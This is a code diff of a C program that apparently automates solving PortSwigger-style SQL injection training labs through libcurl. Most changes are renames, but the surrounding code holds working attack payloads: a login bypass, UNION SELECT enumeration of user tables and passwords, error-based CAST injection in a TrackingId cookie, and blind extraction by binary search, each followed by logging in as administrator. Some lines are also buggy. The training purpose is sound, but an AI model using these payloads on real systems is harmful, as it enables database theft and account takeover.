@@ -17,17 +17,17 @@ typedef struct {
 CURL *curl;
 char url[200];
 char html_response[100000];
-char header_buffer[10000];
+char html_header[10000];
 char csrf_token[100];
 
-int extract_value_from_html_response(char* extracted_value, const char* value_start, const char* value_end, const int number_of_characters_to_skip) 
+int extract_value_from_curl_response(char* extracted_value, const char* value_start, const char* value_end, const int number_of_characters_to_skip) 
 {
     const char *start_point = strstr(html_response, value_start);
     if (start_point) {
         start_point += number_of_characters_to_skip;
         const char *end_point = strstr(start_point, value_end);
 
-        if (end_point) {
+        if (end_point)  {
             strncpy(extracted_value, start_point, end_point - start_point);
             extracted_value[end_point - start_point] = '\0';
             return 0;
@@ -58,17 +58,14 @@ int find_lab_id()
             {"Blind SQL injection with time delays and information retrieval",                      15}
     };
     
-    int lab_id = -1;
     char lab_name[90];
 
     // lab name is kept between title tags
-    extract_value_from_html_response(lab_name, "<title>", "</title>", 7);
+    extract_value_from_curl_response(lab_name, "<title>", "</title>", 7);
     
-    for (size_t i = 0; i < sizeof(lab_mappings) / sizeof(lab_mappings[0]); i++) {
-        if (strcmp(lab_name, lab_mappings[i].lab_name) == 0) {
-            lab_id = lab_mappings[i].lab_id;
-            return lab_id;
-        }
+    for (size_t i = 0; i < sizeof(lab_mappings)/sizeof(lab_mappings[0]); i++) {
+        if (strcmp(lab_name, lab_mappings[i].lab_name) == 0)
+            return lab_mappings[i].lab_id;
     }
 
     return -1;
@@ -78,7 +75,7 @@ int find_lab_id()
 int performCurlRequest() 
 {
     memset(html_response, 0, strlen(html_response) + 1);
-    memset(header_buffer, 0, strlen(header_buffer) + 1);
+    memset(html_header, 0, strlen(html_header) + 1);
     CURLcode res = curl_easy_perform(curl);
     if (res != CURLE_OK) {
         fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
@@ -88,18 +85,18 @@ int performCurlRequest()
 }
 
 
-size_t write_callback(const char *data, size_t size, size_t count) 
+size_t write_callback(const char *response_data, size_t size, size_t count) 
 {
     size_t total_size = size * count;
-    strncat(html_response, data, strlen(data) + 1);
+    strncat(html_response, response_data, strlen(response_data) + 1);
     return total_size;
 }
 
 
-size_t write_header_callback(const char *data, size_t size, size_t count) 
+size_t write_header_callback(const char *header_data, size_t size, size_t count) 
 {
     size_t total_size = size * count;
-    strncat(header_buffer, data, strlen(data) + 1);
+    strncat(html_header, header_data, strlen(header_data) + 1);
     return total_size;
 }
 
@@ -114,17 +111,19 @@ void reset_curl_settings()
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, html_response);
     curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, write_header_callback);
-    curl_easy_setopt(curl, CURLOPT_HEADERDATA, header_buffer);
+    curl_easy_setopt(curl, CURLOPT_HEADERDATA, html_header);
 }
 
 
 void login_as_administrator(const char *admin_password, const char *login_url, char *post_data) 
 {
+    // semding a http get request to the login page and extracting csrf token
     curl_easy_setopt(curl, CURLOPT_COOKIE, "");
     curl_easy_setopt(curl, CURLOPT_URL, login_url);
     performCurlRequest();
-    extract_value_from_html_response(csrf_token, "value=\"", "\"", 7);
+    extract_value_from_curl_response(csrf_token, "value=\"", "\"", 7);
 
+    // logging in as administrator
     snprintf(post_data, 150, "csrf=%s&username=administrator&password=%s", csrf_token, admin_password);
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
 
@@ -150,7 +149,7 @@ int is_lab_url()
 
 int clear_url() 
 {
-    // Deletes everything after the third "/" sign with the third "/".
+    // deletes everything after the third "/" sign with the third "/"
     int slashCount = 0;
 
     for (int i = 0; url[i] != '\0'; i++) {
@@ -163,7 +162,7 @@ int clear_url()
         }
     }
 
-    // If the url ends with newline, it deletes it.
+    // if the url ends with newline, it deletes it
     size_t length = strlen(url);
     if (length > 0 && strlen(url)-1 == '\n') {
         url[length - 1] = '\0';
@@ -177,7 +176,8 @@ int determine_column_count(char* comment_sign)
 {
     int i = 1;
     int max_attempts = 15;
-    while (i < max_attempts) {
+
+    while(i < max_attempts) {
         if (strstr(html_response, "Internal Server Error") != NULL) {
             i -= 2;
             break;
@@ -203,7 +203,7 @@ int is_the_lab_solved()
     performCurlRequest();
     performCurlRequest();
     
-    if(strstr(html_response, "Congratulations, you solved the lab!") == 0)
+    if(strstr(html_response, "Congratulations, you solved the lab!") != NULL)
         return 0;
     else
         return -1;
@@ -235,7 +235,7 @@ int solve_the_lab(const int lab_to_be_solved)
         // Lab name: "SQL injection vulnerability allowing login bypass"
         curl_easy_setopt(curl, CURLOPT_URL, login_url);
         performCurlRequest();
-        extract_value_from_html_response(csrf_token, "value=\"", "\"", 7);
+        extract_value_from_curl_response(csrf_token, "value=\"", "\"", 7);
 
         snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator'--&password=password", csrf_token);
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
@@ -333,7 +333,7 @@ int solve_the_lab(const int lab_to_be_solved)
         clear_url(url);
 
         // find the name of the table containing user credentials
-        extract_value_from_html_response(users_table_name, "users_", "<", 0);
+        extract_value_from_curl_response(users_table_name, "users_", "<", 0);
 
         // retrieve the details of the columns in the user table
         strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+column_name", sizeof(sqli_payload));
@@ -352,8 +352,8 @@ int solve_the_lab(const int lab_to_be_solved)
         clear_url(url);
 
         // finding the names of the columns containing usernames and passwords
-        extract_value_from_html_response(usernames_column_name, "username_", "<", 0);
-        extract_value_from_html_response(passwords_column_name, "password_", "<", 0);
+        extract_value_from_curl_response(usernames_column_name, "username_", "<", 0);
+        extract_value_from_curl_response(passwords_column_name, "password_", "<", 0);
 
         // retrieve the details of the columns in the users_table_name table
         snprintf(sqli_payload, 100, "/filter?category=Accessories'+UNION+SELECT+%s,+%s", usernames_column_name, passwords_column_name);
@@ -372,7 +372,7 @@ int solve_the_lab(const int lab_to_be_solved)
         clear_url(url);
 
         // extract administrator's password from column
-        extract_value_from_html_response(admin_password, "administrator", "<", 51);
+        extract_value_from_curl_response(admin_password, "administrator", "<", 51);
 
         // login as administrator and solve the lab
         login_as_administrator(admin_password, login_url, post_data);
@@ -399,7 +399,7 @@ int solve_the_lab(const int lab_to_be_solved)
         clear_url(url);
 
         // finding the names of the columns containing usernames and passwords
-        extract_value_from_html_response(users_table_name, ">USERS_", "<", 1);
+        extract_value_from_curl_response(users_table_name, ">USERS_", "<", 1);
 
         // retrieve the details of the columns in the user table
         strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+column_name", 100);
@@ -419,8 +419,8 @@ int solve_the_lab(const int lab_to_be_solved)
         clear_url(url);
 
         // finding the names of the columns containing usernames and passwords
-        extract_value_from_html_response(usernames_column_name, "USERNAME_", "<", 0);
-        extract_value_from_html_response(passwords_column_name, "PASSWORD_", "<", 0);
+        extract_value_from_curl_response(usernames_column_name, "USERNAME_", "<", 0);
+        extract_value_from_curl_response(passwords_column_name, "PASSWORD_", "<", 0);
 
         // retrieve the details of the columns in the users_table_name table
         snprintf(sqli_payload, 100, "/filter?category=Accessories'+UNION+SELECT+%s,+%s", usernames_column_name, passwords_column_name);
@@ -436,7 +436,7 @@ int solve_the_lab(const int lab_to_be_solved)
         clear_url(url);
 
         // extract administrator's password from column
-        extract_value_from_html_response(admin_password, "administrator", "<", 51);
+        extract_value_from_curl_response(admin_password, "administrator", "<", 51);
 
         // login as administrator and solve the lab
         login_as_administrator(admin_password, login_url, post_data);
@@ -469,7 +469,7 @@ int solve_the_lab(const int lab_to_be_solved)
 
         // extracting the text provided by the lab
         char *db_string;
-        extract_value_from_html_response(db_string, "Make the database retrieve the string: '", "\'", 40);
+        extract_value_from_curl_response(db_string, "Make the database retrieve the string: '", "\'", 40);
 
         // try replacing each null with the random value
         strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+NULL", 100);
@@ -517,7 +517,7 @@ int solve_the_lab(const int lab_to_be_solved)
         performCurlRequest();
 
         // extract administrator's password from column
-        extract_value_from_html_response(admin_password, "administrator", "<", 51);
+        extract_value_from_curl_response(admin_password, "administrator", "<", 51);
 
         // login as administrator and solve the lab
         login_as_administrator(admin_password, login_url, post_data);
@@ -535,7 +535,7 @@ int solve_the_lab(const int lab_to_be_solved)
         performCurlRequest();
 
         // extract administrator's password from column
-        extract_value_from_html_response(admin_password, "administrator", "<", 51);
+        extract_value_from_curl_response(admin_password, "administrator", "<", 51);
 
         // login as administrator and solve the lab
         login_as_administrator(admin_password, login_url, post_data);
@@ -552,7 +552,7 @@ int solve_the_lab(const int lab_to_be_solved)
         fclose(cookie_file);
 
         performCurlRequest();
-        extract_value_from_html_response(tracking_id_cookie, "TrackingId=", ";", 11);
+        extract_value_from_curl_response(tracking_id_cookie, "TrackingId=", ";", 11);
 
         int until_administrator_password_length = 1;
         // left, right and mid value for binary search
@@ -591,7 +591,7 @@ int solve_the_lab(const int lab_to_be_solved)
     else if (lab_to_be_solved == 12) {
         // Lab name: "Blind SQL injection with conditional errors"
         performCurlRequest();
-        extract_value_from_html_response(tracking_id_cookie, "TrackingId=", ";", 11);
+        extract_value_from_curl_response(tracking_id_cookie, "TrackingId=", ";", 11);
 
         int until_administrator_password_length = 1;
         // left, right and mid value for binary search
@@ -633,7 +633,7 @@ int solve_the_lab(const int lab_to_be_solved)
         curl_easy_setopt(curl, CURLOPT_COOKIE, "TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--");
         performCurlRequest();
 
-        extract_value_from_html_response(admin_password, "integer: ", "\"", 10);
+        extract_value_from_curl_response(admin_password, "integer: ", "\"", 10);
 
         // login as administrator and solve the lab
         login_as_administrator(admin_password, login_url, post_data);
@@ -648,7 +648,7 @@ int solve_the_lab(const int lab_to_be_solved)
     else if (lab_to_be_solved == 15) {
         // Lab name: "Blind SQL injection with time delays and information retrieval"
         performCurlRequest();
-        extract_value_from_html_response(tracking_id_cookie, "TrackingId=", ";", 11);
+        extract_value_from_curl_response(tracking_id_cookie, "TrackingId=", ";", 11);
 
         int until_administrator_password_length = 1;
         int current_character_ascii_value = -1;
@@ -681,10 +681,7 @@ int solve_the_lab(const int lab_to_be_solved)
     }
 
     quit:
-        if(is_the_lab_solved() == 0)
-            return 0;
-        else
-            return -1;
+        return is_the_lab_solved();
 }   
 
 
@@ -767,7 +764,7 @@ int main()
         exit_with_error_message("[-] curl initialization failed (error in initialize_curl() function.\n");
    
     if (solve_the_lab(find_lab_id(html_response)) == 0)
-        printf("[+] Lab successfully solved!\n");
+        printf("[+] Lab solved successfully!\n");
     else
         exit_with_error_message("[-] lab solution failed. (something went wront in solve_the_lab())\n");
 
